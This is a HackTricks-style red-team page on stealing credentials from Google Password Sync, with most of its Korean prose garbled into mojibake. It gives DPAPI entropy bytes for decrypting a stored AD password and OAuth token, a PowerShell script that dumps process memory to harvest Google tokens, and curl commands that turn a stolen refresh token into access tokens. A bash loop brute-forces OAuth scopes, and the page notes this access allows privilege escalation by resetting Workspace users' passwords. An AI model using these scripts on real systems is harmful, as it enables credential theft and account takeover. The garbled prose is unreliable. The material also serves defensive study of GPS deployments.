# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ì´ê²ƒì€ Googleì´ **ADì™€ Workspace ê°„ì˜ ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ë™ê¸°í™”í•˜ê¸° ìœ„í•´ ì œê³µí•˜ëŠ” ë°”ì´ë„ˆë¦¬ ë° ì„œë¹„ìŠ¤**ì…ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ADì—ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½í•  ë•Œë§ˆë‹¤ Googleì— ì„¤ì •ë©ë‹ˆë‹¤.

`C:\Program Files\Google\Password Sync`ì— ì„¤ì¹˜ë˜ë©°, ì—¬ê¸°ì—ì„œ êµ¬ì„±í•  ìˆ˜ ìˆëŠ” ë°”ì´ë„ˆë¦¬ `PasswordSync.exe`ì™€ ê³„ì† ì‹¤í–‰ë˜ëŠ” ì„œë¹„ìŠ¤ì¸ `password_sync_service.exe`ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### GPS - Configuration

ì´ ë°”ì´ë„ˆë¦¬(ë° ì„œë¹„ìŠ¤)ë¥¼ êµ¬ì„±í•˜ë ¤ë©´ **Workspaceì—ì„œ Super Admin ì£¼ì²´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤**:

* Googleì„ í†µí•´ **OAuth**ë¡œ ë¡œê·¸ì¸í•œ í›„ **ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— í† í°ì„ ì €ì¥í•©ë‹ˆë‹¤(ì•”í˜¸í™”ë¨)**
* GUIê°€ ìˆëŠ” ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì—ì„œë§Œ ì‚¬ìš© ê°€ëŠ¥
* **Workspace ì‚¬ìš©ì ê´€ë¦¬** ê¶Œí•œì´ ìˆëŠ” **GCPì˜ ì„œë¹„ìŠ¤ ê³„ì • ìê²© ì¦ëª…(json íŒŒì¼)** ì œê³µ
* ì´ëŸ¬í•œ ìê²© ì¦ëª…ì€ ë§Œë£Œë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì•…ìš©ë  ìˆ˜ ìˆì–´ ë§¤ìš° ë‚˜ìœ ì•„ì´ë””ì–´ì…ë‹ˆë‹¤.
* SAê°€ Workspaceì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ê°–ëŠ” ê²ƒì€ ë§¤ìš° ë‚˜ìœ ì•„ì´ë””ì–´ì…ë‹ˆë‹¤. SAê°€ GCPì—ì„œ ì†ìƒë  ê²½ìš° Workspaceë¡œ í”¼ë²—í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* Googleì€ GUIê°€ ì—†ëŠ” ë„ë©”ì¸ ì œì–´ë¥¼ ìœ„í•´ ì´ë¥¼ ìš”êµ¬í•©ë‹ˆë‹¤.
* ì´ëŸ¬í•œ ìê²© ì¦ëª…ë„ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥ë©ë‹ˆë‹¤.

ADì™€ ê´€ë ¨í•˜ì—¬ í˜„ì¬ **ì‘ìš© í”„ë¡œê·¸ë¨ ì»¨í…ìŠ¤íŠ¸, ìµëª… ë˜ëŠ” íŠ¹ì • ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ë„ë¡ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìê²© ì¦ëª… ì˜µì…˜ì´ ì„ íƒë˜ë©´ **ì‚¬ìš©ì ì´ë¦„**ì€ **ë””ìŠ¤í¬**ì˜ íŒŒì¼ì— ì €ì¥ë˜ê³  **ë¹„ë°€ë²ˆí˜¸**ëŠ” **ì•”í˜¸í™”ë˜ì–´** **ë ˆì§€ìŠ¤íŠ¸ë¦¬**ì— ì €ì¥ë©ë‹ˆë‹¤.

### GPS - Dumping password and token from disk

{% hint style="success" %}
Note that [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) is capable to detect **GPS**, get information about the configuration and **even decrypt the password and token**.
{% endhint %}

íŒŒì¼ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`**ì—ì„œ êµ¬ì„±ì˜ ì¼ë¶€ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì—ëŠ” êµ¬ì„±ëœ ADì˜ **`baseDN`**ê³¼ ì‚¬ìš© ì¤‘ì¸ ìê²© ì¦ëª…ì˜ **`username`**ì´ í¬í•¨ë©ë‹ˆë‹¤.

ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKLM\Software\Google\Google Apps Password Sync`**ì—ì„œ **ì•”í˜¸í™”ëœ ìƒˆë¡œ ê³ ì¹¨ í† í°**ê³¼ AD ì‚¬ìš©ì(ìˆëŠ” ê²½ìš°)ì˜ **ì•”í˜¸í™”ëœ ë¹„ë°€ë²ˆí˜¸**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, í† í° ëŒ€ì‹  **SA ìê²© ì¦ëª…**ì´ ì‚¬ìš©ë˜ëŠ” ê²½ìš°, í•´ë‹¹ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ì£¼ì†Œì—ì„œ ì•”í˜¸í™”ëœ ìê²© ì¦ëª…ë„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ë‚´ì˜ **ê°’**ì€ **ê´€ë¦¬ì**ë§Œ **ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•”í˜¸í™”ëœ **ë¹„ë°€ë²ˆí˜¸**(ìˆëŠ” ê²½ìš°)ëŠ” í‚¤ **`ADPassword`** ë‚´ì— ìˆìœ¼ë©°, **`CryptProtectData`** APIë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë©ë‹ˆë‹¤. ì´ë¥¼ í•´ë…í•˜ë ¤ë©´ ë¹„ë°€ë²ˆí˜¸ ë™ê¸°í™”ë¥¼ êµ¬ì„±í•œ ì‚¬ìš©ìì™€ ë™ì¼í•´ì•¼ í•˜ë©°, **`CryptUnprotectData`**ë¥¼ ì‚¬ìš©í•  ë•Œ ë‹¤ìŒ **ì—”íŠ¸ë¡œí”¼**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

ì•”í˜¸í™”ëœ í† í°(ìˆëŠ” ê²½ìš°)ì€ í‚¤ **`AuthToken`** ë‚´ì— ìˆìœ¼ë©°, **`CryptProtectData`** APIë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë©ë‹ˆë‹¤. ì´ë¥¼ í•´ë…í•˜ë ¤ë©´ ë¹„ë°€ë²ˆí˜¸ ë™ê¸°í™”ë¥¼ êµ¬ì„±í•œ ì‚¬ìš©ìì™€ ë™ì¼í•´ì•¼ í•˜ë©°, **`CryptUnprotectData`**ë¥¼ ì‚¬ìš©í•  ë•Œ ë‹¤ìŒ **ì—”íŠ¸ë¡œí”¼**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
ë˜í•œ, **`0123456789abcdefghijklmnopqrstv`** ì‚¬ì „ì„ ì‚¬ìš©í•˜ì—¬ base32hexë¡œ ì¸ì½”ë”©ë©ë‹ˆë‹¤.

ì—”íŠ¸ë¡œí”¼ ê°’ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” **`CryptUnprotectData`** ë° **`CryptProtectData`**ì— ëŒ€í•œ í˜¸ì¶œì„ ëª¨ë‹ˆí„°ë§í•˜ë„ë¡ êµ¬ì„±ë˜ì—ˆìœ¼ë©°, ê·¸ëŸ° ë‹¤ìŒ `PasswordSync.exe`ë¥¼ ì‹¤í–‰í•˜ê³  ëª¨ë‹ˆí„°ë§í•˜ëŠ” ë° ì‚¬ìš©ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” êµ¬ì„±ëœ ë¹„ë°€ë²ˆí˜¸ì™€ ì¸ì¦ í† í°ì„ ì²˜ìŒì— í•´ë…í•˜ë©°, ë‘ ê²½ìš° ëª¨ë‘ ì‚¬ìš©ëœ ì—”íŠ¸ë¡œí”¼ ê°’ì„ **í‘œì‹œí•©ë‹ˆë‹¤**:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

ì´ API í˜¸ì¶œì˜ ì…ë ¥ ë˜ëŠ” ì¶œë ¥ì—ì„œ **í•´ë…ëœ** ê°’ì„ ë³¼ ìˆ˜ ìˆëŠ” ê²ƒë„ ì£¼ëª©í•  ë§Œí•©ë‹ˆë‹¤(Winpeasê°€ ì‘ë™ì„ ë©ˆì¶˜ ê²½ìš°).

Password Syncê°€ **SA ìê²© ì¦ëª…ìœ¼ë¡œ êµ¬ì„±ëœ ê²½ìš°**, ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKLM\Software\Google\Google Apps Password Sync`** ë‚´ì˜ í‚¤ì— ì €ì¥ë©ë‹ˆë‹¤.

### GPS - Dumping tokens from memory

GCPWì™€ ë§ˆì°¬ê°€ì§€ë¡œ `PasswordSync.exe` ë° `password_sync_service.exe` í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¯¸ ìƒì„±ëœ ê²½ìš° ìƒˆë¡œ ê³ ì¹¨ ë° ì•¡ì„¸ìŠ¤ í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
AD êµ¬ì„± ìê²© ì¦ëª…ë„ ì°¾ì„ ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.

<details>

<summary>Dump <code>PasswordSync.exe</code> and the <code>password_sync_service.exe</code> processes and search tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - ë¦¬í”„ë ˆì‹œ í† í°ìœ¼ë¡œ ì•¡ì„¸ìŠ¤ í† í° ìƒì„±í•˜ê¸°

ë¦¬í”„ë ˆì‹œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ëª…ë ¹ì— ì§€ì •ëœ í´ë¼ì´ì–¸íŠ¸ IDì™€ í´ë¼ì´ì–¸íŠ¸ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
ë¦¬í”„ë ˆì‹œ í† í°ì´ ìˆë”ë¼ë„, ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì§€ì›í•˜ëŠ” **ìŠ¤ì½”í”„ë§Œ ìš”ì²­í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì—** ì•¡ì„¸ìŠ¤ í† í°ì— ëŒ€í•œ ìŠ¤ì½”í”„ë¥¼ ìš”ì²­í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.

ë˜í•œ, ë¦¬í”„ë ˆì‹œ í† í°ì€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ íš¨í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

ê¸°ë³¸ì ìœ¼ë¡œ GPSëŠ” ì‚¬ìš©ìê°€ ëª¨ë“  ê°€ëŠ¥í•œ OAuth ìŠ¤ì½”í”„ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `refresh_token`ìœ¼ë¡œ `access_token`ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ìŠ¤ì½”í”„ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ê·¸ë¦¬ê³  ì´ê²ƒì€ ì œê°€ ì‘ì„± ë‹¹ì‹œ ë°›ì€ ì¶œë ¥ì…ë‹ˆë‹¤:
```
https://www.googleapis.com/auth/admin.directory.user
```
ì–´ë–¤ ë²”ìœ„ë¥¼ ì§€ì •í•˜ì§€ ì•Šìœ¼ë©´ ì–»ëŠ” ê²ƒê³¼ ë™ì¼í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ì´ ë²”ìœ„ë¡œ **ê¸°ì¡´ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
{% endhint %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
